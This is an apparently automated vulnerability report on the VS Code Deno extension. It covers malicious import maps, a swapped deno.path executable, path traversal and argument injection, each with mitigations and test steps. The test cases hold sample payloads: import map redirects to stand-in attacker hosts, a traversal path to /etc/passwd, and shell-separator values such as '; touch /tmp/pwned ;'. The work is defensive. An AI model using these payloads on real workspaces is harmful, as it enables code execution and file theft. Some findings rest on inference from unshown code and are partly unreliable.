## Combined Vulnerability List

### Malicious Import Map Configuration / Import Map Remote Code Execution

* Description:
    1. An attacker crafts a malicious `import_map.json` file. This file redirects standard module specifiers to attacker-controlled locations. For example, it could redirect `https://deno.land/std/http/server.ts` to `https://malicious.attacker.com/evil_server.ts`.
    2. The attacker social engineers a victim (VS Code user using the Deno extension) into configuring their project to use the attacker's malicious `import_map.json` file. This can be achieved by:
        - Tricking the victim into manually setting the `deno.importMap` setting in VS Code to point to the attacker's malicious file (e.g., a file hosted on a public URL or included in a seemingly benign project repository).
        - Convincing the victim to open a project workspace that already contains a `.vscode/settings.json` file pre-configured with the malicious `deno.importMap` setting, pointing to a file within the project or an external URL, or a `deno.json` file with the malicious configuration.
    3. The victim opens a Deno project in VS Code with the Deno extension enabled.
    4. The Deno extension reads the `deno.importMap` setting, which now points to the attacker's malicious import map.
    5. When the Deno extension (or the underlying Deno Language Server) resolves module imports within the victim's project (e.g., during type checking, linting, formatting, or running tests/tasks), it uses the configured import map.
    6. Due to the malicious import map, module specifiers are resolved to attacker-controlled locations.
    7. The Deno extension fetches and potentially executes code from the attacker's controlled locations as part of the development process within the victim's VS Code environment. This could happen during operations like type checking, code completion, or when running Deno tasks or tests within the IDE. Upon fetching the module, the attacker's malicious script is executed within the context of the user's VS Code environment.

* Impact:
    - **Code Execution:** An attacker can achieve arbitrary code execution within the victim's development environment. This malicious code can steal sensitive information (credentials, source code, environment variables), modify project files, install malware, or further compromise the victim's system and potentially allow for lateral movement in corporate environments.
    - **Project Corruption:** The attacker can inject malicious code into the victim's project, leading to corrupted builds, unexpected behavior, and potential supply chain attacks if the compromised project is shared or deployed.
    - **Data Theft**: The attacker can gain unauthorized access to sensitive data within the workspace, such as source code, environment variables, credentials, and other project-related files.
    - **Account Takeover**: If the user has credentials stored in the workspace or accessible from the environment, the attacker could potentially steal these credentials and gain unauthorized access to user accounts and systems.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None evident from the provided project files. The extension reads and utilizes the `deno.importMap` setting as configured by the user without any apparent validation or security checks on the import map file's content or source.

* Missing Mitigations:
    - **Validation of `deno.importMap` source:** The extension should validate the source of the `deno.importMap` file. If it's a remote URL, consider warning the user about the potential risks before using it.
    - **URL Validation in Import Maps**: Implement validation for URLs specified in `deno.importMap`. This could involve domain whitelisting/blacklisting, and scheme validation to restrict import map URLs to specific schemes (e.g., `https:`).
    - **User Warning for Import Map Redirections**: When a workspace with a `deno.importMap` is opened, and the import map contains redirections to external domains, display a warning to the user. This warning should clearly explain the risks associated with import map redirections and advise caution.
    - **Configuration Option to Disable/Restrict Import Maps**: Provide a configuration setting that allows users to disable or restrict the usage of `deno.importMap` entirely or to limit its functionality.
    - **Content Security Policy (CSP) for import maps:** If feasible, explore using CSP mechanisms to restrict the domains from which import maps can be loaded, or restrict the types of URLs allowed in import maps.
    - **Sandboxing or Isolation:**  Investigate sandboxing or isolating the module resolution and execution processes that utilize the import map, to limit the impact of potentially malicious code loaded through a compromised import map.

* Preconditions:
    1. The victim must have the VS Code Deno extension installed and enabled in their workspace.
    2. The victim must be tricked into configuring the `deno.importMap` setting to point to a malicious import map file, either manually or by opening a workspace with a pre-configured malicious setting.
    3. The user must open or create a Deno file within this workspace that contains an import statement using a specifier redirected in the malicious `deno.importMap`.

* Source Code Analysis:
    1. **`client/src/extension.ts`**:
        - In `clientOptions.initializationOptions`, the extension reads the `denoConfiguration` which includes the `deno.importMap` setting from VS Code workspace configuration and sends it to the Deno Language Server during initialization.
    2. **`client/src/debug_config_provider.ts`**:
        - The `DenoDebugConfigurationProvider` in `#getAdditionalRuntimeArgs` reads `settings.importMap` which comes from `clientOptions.initializationOptions` and passes the `deno.importMap` setting directly to the Deno CLI when debugging.
    3. **Documentation**:
        - `README.md` and `docs/workspaceFolders.md` confirm the existence and purpose of the `deno.importMap` setting, describing it as equivalent to using `--import-map` on the command line.
    4. **Absence of Validation**:
        - By reviewing the code, particularly in `client/src/extension.ts` and `client/src/debug_config_provider.ts`, there is no visible code that validates the source or content of the `deno.importMap` file. The extension appears to trust the user-provided path and uses it directly.

* Security Test Case:
    1. **Attacker Setup:**
        - Create a malicious JavaScript/TypeScript file (e.g., `evil_module.ts`) hosted on a publicly accessible web server with code intended to be executed on the victim's machine.
        - Create a malicious `import_map.json` file (e.g., `malicious_import_map.json`) also hosted on a publicly accessible web server. This import map redirects a common module specifier to the attacker's malicious file (e.g., `"std/http/server.ts": "https://malicious.attacker.com/evil_module.ts"` or `"lodash": "http://attacker.example.com/malicious_lodash.js"`).
        - Alternatively, prepare a malicious workspace with these files for distribution.
    2. **Victim Setup:**
        - Open VS Code and create a new empty workspace or open an existing Deno project.
        - Enable the Deno extension for the workspace.
        - In VS Code settings for the workspace, set the `deno.importMap` setting to the URL of the attacker's malicious import map or open the malicious workspace.
        - Create a simple Deno file (e.g., `test.ts` or `main.ts`) in the workspace that imports a module that is redirected by the malicious import map (e.g., `import * as server from "std/http/server.ts";` or `import _ from "lodash";`).
    3. **Triggering the Vulnerability:**
        - Open the `test.ts` file in VS Code.
        - The Deno extension will attempt to type check, lint, or provide code completion.
        - Alternatively, run a Deno task or test within the VS Code integrated terminal or using code lenses.
    4. **Verification:**
        - Observe the VS Code output panel for the Deno extension or the integrated terminal output. Look for messages from the malicious script (e.g., "Malicious code executed!" or "Malicious code from attacker.example.com executed!").
        - In a real attack scenario, the malicious code could perform more harmful actions without being immediately visible in the output, such as attempts to access local files or exfiltrate data.

### Malicious Deno Path Execution / Arbitrary Code Execution via Malicious Deno Executable Path

* Description:
    1. An attacker socially engineers a user into changing the `deno.path` setting in VS Code.
    2. The user, unknowingly sets `deno.path` to point to a malicious executable on their system, believing they are customizing their Deno extension experience or under false pretenses. This can also be achieved by compromising the user's settings file.
    3. The VS Code Deno extension, upon activation or when triggered by a Deno command (like type checking, formatting, testing, etc.), uses the configured `deno.path` to locate and execute the Deno CLI.
    4. Instead of executing the legitimate Deno CLI, the extension inadvertently executes the malicious executable specified in `deno.path`.
    5. The malicious executable, now running with the user's privileges, can perform arbitrary actions on the user's system, such as data theft, malware installation, system compromise, or privilege escalation.

* Impact:
    - **Critical System Compromise.**
    - **Arbitrary Code Execution** with user privileges.
    - Potential **Data Theft, Malware Installation, and Further System Exploitation.**
    - Complete compromise of the user's system and data.
    - Installation of malware, spyware, or ransomware.
    - Data exfiltration.
    - Unauthorized access to sensitive resources.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The extension directly uses the path provided in the `deno.path` setting without any validation or security checks.
    - The `README.md` provides a warning message about the `deno.path` setting, advising users to install Deno CLI and explicitly set the path if needed. However, this is documentation and not a code-level mitigation.

* Missing Mitigations:
    - **Path Validation:** The extension should validate the `deno.path` setting to ensure it points to a legitimate Deno executable by checking if the path is a valid file path and if the file is executable.
    - **Executable Validation:** Implement checks to verify the integrity and authenticity of the Deno executable. This could include signature verification, known path checks to warn if the path is unusual, and heuristics to detect potentially malicious executables.
    - **Input validation and sanitization for the `deno.path` setting**: Verify that the path points to a valid executable file, check if the path is within expected locations, and consider using file hash or digital signature verification.
    - **User Warning:** If the `deno.path` is manually configured, display a prominent warning to the user, emphasizing the security risks of pointing to untrusted executables and advising them to only set this path if they are absolutely sure about the executable's origin and integrity.
    - **User confirmation**: The extension could prompt the user for confirmation before executing a Deno command if the `deno.path` setting is configured to a non-standard location.
    - **Running Deno in a sandbox**: The extension could run the Deno CLI in a sandboxed environment to limit the impact of a malicious executable.
    - **User awareness and security education**: Clearly document the security risks associated with modifying the `deno.path` setting and warn users against setting `deno.path` to executables from untrusted sources.

* Preconditions:
    1. The user must have the VS Code Deno extension installed.
    2. An attacker must successfully socially engineer the user into manually configuring the `deno.path` setting in VS Code to point to a malicious executable.
    3. The user must trigger any functionality of the Deno extension that necessitates the execution of the Deno CLI.

* Source Code Analysis:
    1. **`client/src/util.ts`**: The `getDenoCommandPath` function retrieves the `deno.path` from the workspace configuration using `getWorkspaceConfigDenoExePath` without validation. If a user sets this to a malicious executable path, the function will directly return it.
    2. **`client/src/commands.ts`**: The `startLanguageServer` function calls `getDenoCommandPath()` to obtain the `command`, which can be a path to a malicious executable. This `command` variable is directly used in `serverOptions.run.command` and `serverOptions.debug.command` without any checks, leading to the execution of the malicious executable.

* Security Test Case:
    1. **Setup Malicious Executable:** Create a malicious executable (e.g., `deno` or `deno.exe`) that writes to a log file or displays a warning message instead of being a legitimate Deno CLI.
    2. **Configure VS Code Deno Extension:** Open VS Code settings and set `deno.path` to point to the malicious executable.
    3. **Enable Deno Extension (if not already enabled).**
    4. **Trigger Extension Functionality:** Open any JavaScript or TypeScript file in the workspace where Deno is enabled to trigger the Deno language server startup or other Deno commands.
    5. **Verify Malicious Execution:** Check for the log file or warning message created by the malicious executable. Observe that the Deno extension might not function correctly because the malicious executable is not a valid Deno CLI and likely exits with an error.

### Path Traversal in Deno Configuration Files

* Description:
    1. An attacker crafts a malicious workspace.
    2. Within this workspace, the attacker creates a `deno.config` or `deno.importMap` file.
    3. In these configuration files, the attacker specifies file paths that include path traversal sequences (e.g., `../`, `../../`).
    4. A user opens this malicious workspace in Visual Studio Code with the Deno extension enabled.
    5. The Deno extension reads the `deno.config` or `deno.importMap` file.
    6. The extension uses the attacker-controlled path from the configuration file to access files on the user's system.
    7. Due to the lack of path traversal sanitization, the extension may access files outside the workspace directory, potentially leading to arbitrary file access.

* Impact:
    - **Arbitrary File Read**: An attacker can read sensitive files on the user's system by crafting a malicious workspace and enticing the user to open it. This could include source code, configuration files, or personal documents.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - None identified in the provided project files. The code reads the configuration paths from settings and uses them directly without sanitization.

* Missing Mitigations:
    - **Path Sanitization**: The extension should sanitize the paths provided in `deno.config` and `deno.importMap` settings to prevent path traversal vulnerabilities. This can be achieved by:
        - Resolving paths relative to the workspace root.
        - Validating that the resolved path stays within the workspace boundaries.
        - Using secure path manipulation functions that prevent traversal.

* Preconditions:
    1. The user must have the "Deno for Visual Studio Code" extension installed and enabled.
    2. The user must open a workspace that contains a malicious `deno.config` or `deno.importMap` file crafted by the attacker.

* Source Code Analysis:
    1. **Configuration Loading:** The extension reads the `deno.config` and `deno.importMap` settings from VS Code's workspace configuration using `vscode.workspace.getConfiguration(EXTENSION_NS)`.
    2. **Path Usage:** The values obtained from `deno.config` and `deno.importMap` settings are treated as file paths and used by the extension and Deno CLI.
    3. **Lack of Sanitization:**  There is no visible code in the provided files that sanitizes or validates these paths against path traversal attacks before using them to access files. The extension appears to trust the paths provided in the configuration without proper checks.

* Security Test Case:
    1. **Setup Malicious Workspace:** Create a workspace with a `import_map.json` file containing a path traversal sequence in the "imports" section (e.g., `"malicious": "../../../../../../../../../../../../../../../etc/passwd"`). Include a `.vscode/settings.json` to enable Deno and set `deno.importMap` to the malicious import map.
    2. **Open Malicious Workspace in VSCode:** Open the malicious workspace directory in Visual Studio Code.
    3. **Trigger Vulnerability:** Open a TypeScript file that imports the malicious module defined in the import map (e.g., `import * as passwd from "malicious";`).
    4. **Observe the Impact:** Check the Deno extension's output channel for any error messages related to file access or path traversal. Monitor for file system access attempts outside the workspace directory. An error message indicating a failed file read of `/etc/passwd` or similar confirms the attempted path traversal.

### Command Injection in `deno.codeLens.testArgs` Setting

* Description:
    1. An attacker crafts a malicious workspace configuration file (`.vscode/settings.json`).
    2. In this configuration file, the attacker sets the `deno.codeLens.testArgs` setting to include arbitrary shell commands, for example, `["--allow-all", "; malicious_command;"]` or `["--allow-all", "& malicious_command"]`.
    3. The victim opens the malicious workspace in Visual Studio Code with the Deno extension installed and enabled.
    4. The victim opens a test file (e.g., a TypeScript file containing `Deno.test` calls).
    5. The victim triggers the test runner by clicking the "Run Test" code lens above a test definition or using the Test Explorer.
    6. The Deno extension executes the `deno test` command, incorporating the arguments from the `deno.codeLens.testArgs` setting.
    7. Due to the lack of sanitization, the malicious commands injected by the attacker in `deno.codeLens.testArgs` are executed by the user's shell, leading to command injection.

* Impact:
    - **Remote Code Execution (RCE)**: An attacker can execute arbitrary code on the user's machine with the permissions of the VS Code process.
    - **Data Theft**: The attacker could potentially steal sensitive data from the user's file system.
    - **System Compromise**: In severe scenarios, the attacker might be able to compromise the user's entire system.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations:
    - None. The extension directly reads and uses the `deno.codeLens.testArgs` setting without any sanitization or validation.

* Missing Mitigations:
    - **Input Sanitization and Validation**: Implement validation for the `deno.codeLens.testArgs` setting to ensure it only contains legitimate arguments for the `deno test` command. Reject or sanitize any input that includes shell command separators (like `;`, `&`, `&&`, `||`, `|`, etc.) or other potentially dangerous characters.
    - **Command Argument Escaping**: Properly escape all arguments passed to the `deno test` command when constructing the execution command line.
    - **Restricting allowed arguments**: Limit the allowed arguments to a predefined safe set or format.
    - **User Warning**: Display a warning message to the user if the extension detects potentially unsafe arguments in the `deno.codeLens.testArgs` setting.

* Preconditions:
    1. The user must have the Deno VS Code extension installed and enabled.
    2. The user must open a workspace that contains a malicious `.vscode/settings.json` file that sets a malicious `deno.codeLens.testArgs` value.
    3. The user must run tests within the malicious workspace using the extension's test runner (code lens or Test Explorer).

* Source Code Analysis:
    1. **`client\src\commands.ts:test`**: The `test` function retrieves `deno.codeLens.testArgs` configuration and directly incorporates it into the `deno test` command arguments without sanitization.
    2. **`client/src/tasks.ts:buildDenoTask`**: The `buildDenoTask` function creates a `vscode.ProcessExecution` with unsanitized arguments from `deno.codeLens.testArgs`.
    3. `vscode.tasks.executeTask` executes the task with `vscode.ProcessExecution`, passing unsanitized arguments to the shell, leading to command injection.

* Security Test Case:
    1. Create a malicious workspace with `.vscode/settings.json` containing a malicious `deno.codeLens.testArgs` setting (e.g., `["; touch /tmp/pwned ;"]` or `["; echo vulnerable"]`).
    2. Create a test file (e.g., `test_vuln.ts`) with a simple `Deno.test` definition.
    3. Open the workspace in VS Code and open the test file.
    4. Click "▶ Run Test" code lens above the test definition to run the test.
    5. Verify command injection by checking for the side effects of the injected command (e.g., file creation `/tmp/pwned` or output "vulnerable" in the terminal).
